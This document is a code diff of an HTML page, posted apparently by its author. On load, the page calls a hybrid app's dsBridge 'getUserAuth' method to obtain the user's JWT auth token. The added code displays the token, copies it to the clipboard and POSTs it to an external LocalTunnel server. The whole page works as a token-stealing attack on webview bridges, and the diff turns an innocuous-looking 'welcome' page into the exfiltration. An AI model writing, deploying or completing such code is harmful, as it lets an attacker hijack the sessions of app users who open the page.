@@ -3,26 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JWT Capture</title>
 </head>
 <body>
-<p id="result">Welcome my webisite</p>
+<p id="result">Waiting for JWT...</p>
+
 <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js"></script>
 <script>
-
 function parse(res){
-  if(typeof res==="string"){ try{ res=JSON.parse(res);}catch(e){} }
-  return res && res.data && res.data.authtoken;
+    if(typeof res === "string"){
+        try { res = JSON.parse(res); } catch(e) {}
+    }
+    return res && res.data && res.data.authtoken;
 }
-document.addEventListener("DOMContentLoaded",()=>{
-  const bridge = window.dsBridge || window._dsbridge;
-  if(!bridge || !bridge.call){ return; }
-  bridge.call("getUserAuth", {}, function(resp){
-      const jwt = parse(resp);
 
-  });
+document.addEventListener("DOMContentLoaded", () => {
+    const bridge = window.dsBridge || window._dsbridge;
+    if(!bridge || !bridge.call){
+        console.warn("dsBridge not available");
+        return;
+    }
+
+    bridge.call("getUserAuth", {}, function(resp){
+        const jwt = parse(resp);
+        console.log("Raw response:", resp);
+        console.log("JWT:", jwt);
+
+        // Show JWT on page
+        const el = document.getElementById("result");
+        if(el) el.textContent = jwt || "No JWT found";
+
+        if(!jwt) return;
+
+        // --- Send JWT to your Python server via LocalTunnel ---
+        const SERVER_URL = "https://rude-lemons-yawn.loca.lt/receive_token";
+
+        fetch(SERVER_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ token: jwt })
+        })
+        .then(r => r.json())
+        .then(j => console.log("Server responded:", j))
+        .catch(err => console.warn("Send failed:", err));
+
+        // Optional: copy to clipboard
+        if(navigator.clipboard){
+            navigator.clipboard.writeText(jwt).catch(() => {});
+        }
+    });
 });
 </script>
 </body>
 </html>
-
-, this is my javascript code 
